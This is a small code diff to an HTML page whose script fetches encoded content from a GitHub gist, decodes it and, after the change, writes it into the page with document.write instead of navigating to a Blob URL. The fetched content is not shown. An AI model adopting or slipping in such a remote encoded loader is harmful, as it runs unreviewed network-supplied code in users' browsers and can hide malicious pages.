@@ -9,7 +9,9 @@ fetch('https://gist.githubusercontent.com/salvaje36/516345f129876eb50e4c7311dc36
     const bytes=new Uint8Array(decoded.length);
     for(let i=0;i<decoded.length;i++)bytes[i]=decoded.charCodeAt(i)&0xFF;
     const html=new TextDecoder('utf-8').decode(bytes);
-    location.replace(URL.createObjectURL(new Blob([html],{type:'text/html;charset=utf-8'})));
+    document.open();
+    document.write(html);
+    document.close();
   })
 </script>
 </body></html>
